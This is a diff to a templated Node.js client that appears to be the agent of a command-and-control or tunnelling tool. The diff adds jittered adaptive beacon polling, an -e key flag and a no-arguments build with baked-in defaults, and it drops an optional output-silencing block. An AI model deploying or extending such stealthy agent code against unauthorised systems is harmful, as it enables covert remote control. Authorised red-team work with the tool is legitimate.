@@ -1,19 +1,3 @@
-{% if no_print %}
-{
-  const _noop = () => {};
-  console.log = _noop;
-  console.info = _noop;
-  console.warn = _noop;
-  console.error = _noop;
-  console.debug = _noop;
-  try {
-    const fs = require('fs');
-    const _sink = fs.createWriteStream('/dev/null', { flags: 'a' });
-    process.stdout.write = _sink.write.bind(_sink);
-    process.stderr.write = _sink.write.bind(_sink);
-  } catch (e) {}
-}
-{% endif %}
 const crypto = require('crypto');
 const assert = require('assert');
 const net = require('net');
@@ -875,6 +859,13 @@ class HTTPClient extends Client {
 
   async start() {
     await this.readvertiseForwarders();
+{% if not no_adaptive_polling %}
+    let _pollDelay = 0.1;
+    const _POLL_MIN = 0.1;
+    const _POLL_MAX = 10.0;
+    const _POLL_FACTOR = 1.5;
+    const _POLL_JITTER = 0.2;
+{% endif %}
     while (!this.killed) {
       if (this._pending.length === 0) {
         while (this.upstream_messages.length > 0 && this._pending.length < MAX_BATCH_SIZE)
@@ -901,6 +892,14 @@ class HTTPClient extends Client {
             this.handleCheckout();
             break;
           }
+{% if not no_adaptive_polling %}
+          const _realMsgs = messages.filter(m => m.kind !== 'CheckInMessage' && m.kind !== 'CheckOutMessage').length;
+          if (_realMsgs > 0) {
+            _pollDelay = _POLL_MIN;
+          } else {
+            _pollDelay = Math.min(_pollDelay * _POLL_FACTOR, _POLL_MAX);
+          }
+{% endif %}
           for (const m of messages) {
             await this.dispatchMessage(m);
           }
@@ -908,9 +907,18 @@ class HTTPClient extends Client {
           if (e instanceof DecryptionError) throw e;
           throw new Error(`Failed to deserialize server response: ${e.message}`);
         }
+      } else {
+{% if not no_adaptive_polling %}
+        _pollDelay = Math.min(_pollDelay * _POLL_FACTOR, _POLL_MAX);
+{% endif %}
       }
 
+{% if not no_adaptive_polling %}
+      const _jittered = _pollDelay * (1.0 - _POLL_JITTER + Math.random() * 2 * _POLL_JITTER);
+      await new Promise(r => setTimeout(r, _jittered * 1000));
+{% else %}
       await new Promise(r => setTimeout(r, 100));
+{% endif %}
     }
   }
 
@@ -1058,12 +1066,13 @@ function sha256Bytes(s) {
   return crypto.createHash('sha256').update(String(s), 'utf8').digest();
 }
 
+{% if not no_arg_parsing %}
 function printHelp() {
   console.log('Usage: client [options]');
   console.log('');
   console.log('Options:');
   console.log('  --server-url <url>         Server URL to connect to');
-  console.log('  --encryption-key <key>     AES encryption key');
+  console.log('  -e, --encryption-key <key> AES encryption key');
   console.log('  --user-agent <ua>          Custom User-Agent string');
   console.log('  --proxy <url>              Proxy URL');
   console.log('  --retry-duration <secs>    Total time to retry connecting');
@@ -1088,6 +1097,7 @@ function parseArgs(argv) {
         process.exit(0);
         break;
       case '--server-url':
+      case '-e':
       case '--encryption-key':
       case '--user-agent':
       case '--proxy':
@@ -1101,7 +1111,7 @@ function parseArgs(argv) {
         if (a === '--retry-attempts') args.retryAttempts = parseInt(argv[i], 10);
         else if (a === '--retry-duration') args.retryDuration = parseFloat(argv[i]);
         else if (a === '--server-url') args.serverUrl = argv[i];
-        else if (a === '--encryption-key') args.encryptionKey = argv[i];
+        else if (a === '-e' || a === '--encryption-key') args.encryptionKey = argv[i];
         else if (a === '--user-agent') args.userAgent = argv[i];
         else if (a === '--proxy') args.proxy = argv[i];
         break;
@@ -1112,12 +1122,14 @@ function parseArgs(argv) {
   }
   return args;
 }
+{% endif %}
 
 function sleep(ms) {
   return new Promise(res => setTimeout(res, ms));
 }
 
 async function main() {
+{% if not no_arg_parsing %}
   const args = parseArgs(process.argv);
 
   const serverUrl = args.serverUrl || DEFAULTS.SERVER;
@@ -1140,6 +1152,14 @@ async function main() {
   const retryAttempts = Number.isInteger(args.retryAttempts)
     ? args.retryAttempts
     : Number(DEFAULTS.RETRY_ATTEMPTS);
+{% else %}
+  const serverUrl = DEFAULTS.SERVER;
+  let encryptionKey = sha256Bytes(DEFAULTS.ENCRYPTION_KEY);
+  const userAgent = DEFAULTS.USER_AGENT;
+  const proxy = DEFAULTS.PROXY;
+  const retryDuration = Number(DEFAULTS.RETRY_DURATION);
+  const retryAttempts = Number(DEFAULTS.RETRY_ATTEMPTS);
+{% endif %}
 
   let remainder = serverUrl;
   let attempts;
@@ -1162,16 +1182,15 @@ async function main() {
 {% else %}
       if (attempt.includes('ws')) {
 {% endif %}
-        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()} (${i + 1}/${attempts.length})`);
         client = new WSClient(candidateUrl, encryptionKey, userAgent);
       } else if (attempt.includes('http')) {
-        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()} (${i + 1}/${attempts.length})`);
         client = new HTTPClient(candidateUrl, encryptionKey, userAgent);
       } else {
         console.log(`[!] Unsupported scheme ${attempt.toUpperCase()}`);
         continue;
       }
 
+      console.log(`[*] Attempting to connect over ${attempt.toUpperCase()} to ${candidateUrl} (${i + 1}/${attempts.length})`);
       await client.connect();
       console.log(`[+] Connected to ${candidateUrl}`);
       break;
@@ -1213,7 +1232,7 @@ async function main() {
 
     while (consecutiveFailures < retryAttempts) {
       consecutiveFailures++;
-      console.log(`[*] Attempting to reconnect (attempt ${consecutiveFailures}/${retryAttempts})`);
+      console.log(`[*] Attempting to reconnect (${consecutiveFailures}/${retryAttempts})`);
       await sleep(sleepTime * 1000);
       try {
         await client.connect();
